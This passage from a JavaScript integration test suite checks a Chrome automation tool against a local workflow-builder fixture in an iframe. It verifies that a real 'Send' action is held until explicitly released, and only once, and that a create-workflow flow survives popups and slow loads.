      await stage("send_hold", async () => {
        await fresh();
        await step("Create Workflow", () => mcp.call("chrome_act", { tab, selector: { name: "Create Workflow", identifier: "create-workflow" }, kind: "click" }));
        await step("Start from Scratch", () => mcp.call("chrome_act", { tab, selector: { name: "Start from Scratch", identifier: "start-from-scratch" }, kind: "click" }));
        await step("Add Action (opens the drawer)", () => mcp.call("chrome_act", { tab, selector: { name: "Add Action", identifier: "add-action" }, kind: "click" }));
        const sent0 = (await state()).sent.length;
        const tile = await step('click the "Send Email" TILE in the drawer', () => mcp.call("chrome_act", { tab, selector: { role: "button", name: "Send Email", identifier: "action-send-email" }, kind: "click" }));
        need(!tile.held && tile.ok !== false, "send.tile", `the "Send Email" tile was held or failed: ${short(tile)} (a tile in a workflow builder's action drawer picks an action, it sends nothing)`);
        const chosen = await mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "window.__state.chosen" });
        need(val(chosen) === "Send Email", "send.tile", `the tile click did not choose the action (chosen is ${short(val(chosen))})`);
        need((await state()).sent.length === sent0, "send.tile", "the tile click sent a message");
        const h = await step('click the real "Send" submit in the drawer', () => mcp.call("chrome_act", { tab, selector: { role: "button", name: "Send", identifier: "test-send" }, kind: "click" }));
        need(h.held === true && h.id, "send.hold", `the real Send submit was not held: ${short(h)}`);
        await sleep(300);
        need((await state()).sent.length === sent0, "send.hold", "a message was sent although the Send was held");
        const rel = await step("release the held Send (chrome_send)", () => mcp.call("chrome_send", { id: h.id }));
        const seen = await stateWhere(s => s.sent, v => v.length === sent0 + 1, "the released Send (exactly one message)");
        const again = await mcp.call("chrome_send", { id: h.id }).then(() => "sent twice", () => "refused");
        need(again === "refused", "send.hold", "the same held Send could be released twice");
        return { tileHeld: false, sendHeld: true, releasedOk: rel && rel.ok !== false, sent: seen.length, secondSend: again };
      });

      // ---------------------------------------------------------------- (i) the awkward moments, inside the frame
      await stage("robust_flags", async () => {
        await fresh(`${shellUrl}?slow=600&whatsnew=1&guard=1&stale=1&toast=2500`, { noApp: true });
        const before = (await state()).workflows.length;
        const t0 = performance.now();
        const run = await step("chrome_ghl run create-workflow with the popup, slow route, guard and re-render", () => mcp.call("chrome_ghl", { action: "run", tab, flow: "create-workflow", params: { name: "Robust flow", trigger: "contact-created", actions: FRAMES_WORKFLOW.actions } }, 90_000));
        const ms = Math.round(performance.now() - t0);
        need(run.ok !== false, "ghl.run.frames.robust", `the flow failed: ${brief(run)}`);
        const st = await stateWhere(s => s.workflows, v => v.length > before, "the robust workflow");
        need(st[st.length - 1].name === "Robust flow" && st[st.length - 1].actions.length === 2, "ghl.run.frames.robust", `the workflow is ${short(st[st.length - 1])}`);
        const s = await mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "JSON.stringify({ whatsnewClosed: window.__state.whatsnewClosed, discarded: window.__state.discarded, saved: window.__state.saved })" });
        const view = JSON.parse(String(val(s)));
        need(view.whatsnewClosed === 1 && view.discarded === 0 && view.saved === true, "ghl.run.frames.robust", `the popup in the frame was not closed once, or a guard dialog was discarded: ${short(view)}`);
        return { ms, state: view };
      }, 120_000);
    }
  } catch (e) {
    out.fatal = String(/** @type {Error} */ (e).message || e);
    try { out.chromeLogTail = fs.readFileSync(path.join(tmp, "chrome.log"), "utf8").slice(-1500); } catch { /* no log */ }
  } finally {
    log("cleanup");
    try { if (fixture) out.fixtureState = await within(Promise.resolve(fixture.frames.snapshot()), 3000, () => "reading the fixture state").then(s => ({ workflows: s.workflows.map((/** @type {any} */ w) => ({ name: w.name, steps: w.actions.length })), sent: s.sent.length, editorSaves: s.editorSaves.length, acks: s.acks, collected: s.collected.length, api: s.api })); } catch { /* best effort */ }
    stopProcess(chromeProc);
    for (const c of cleanups) try { c(); } catch { /* best effort */ }
    await within(Promise.resolve(fixture?.close()), 5000, () => "closing the fixture").catch(e => log(String(e.message)));
    setTimeout(() => { try { spawnSync("chmod", ["-R", "u+rwX", tmp]); fs.rmSync(tmp, { recursive: true, force: true }); } catch { /* best effort */ } }, 2500).unref();
  }
  const failed = Object.entries(out.stages).filter(([, v]) => /** @type {any} */ (v).ok === false).map(([k]) => k);
  out.ok = !out.fatal && failed.length === 0;
  const s = out.stages;
  const line = `chrome-frames-suite ${out.ok ? "PASS" : "FAIL"} ${out.os}: ${s.frames_listed?.frames ?? "n/a"} frames, snapshot p50 ${out.timings.snapshot?.p50 ?? "n/a"} ms, iframe click p50 ${out.timings.click?.p50 ?? "n/a"} ms, iframe fill p50 ${out.timings.fill?.p50 ?? "n/a"} ms, create-workflow flow ${out.timings.createWorkflowFlow?.ms ?? "n/a"} ms${out.ok ? "" : `; failed: ${[...failed, ...(out.fatal ? ["fatal"] : [])].join(",")}`}`;
  for (const f of failed) console.error(`[frames-suite] FAILED ${f}: ${/** @type {any} */ (s[f]).error}`);
  console.log(JSON.stringify(out, null, 2)); console.log(line);
  stepSummary(`- ${line}${failed.length ? "\n" + failed.map(f => `  - ${f}: ${String(/** @type {any} */ (s[f]).error).slice(0, 300)}`).join("\n") : ""}`);
  writeOut();
  process.exitCode = out.ok ? 0 : 1;
}
main().then(() => setTimeout(() => process.exit(process.exitCode || 0), 3000).unref(), e => { console.error(e); process.exit(1); });
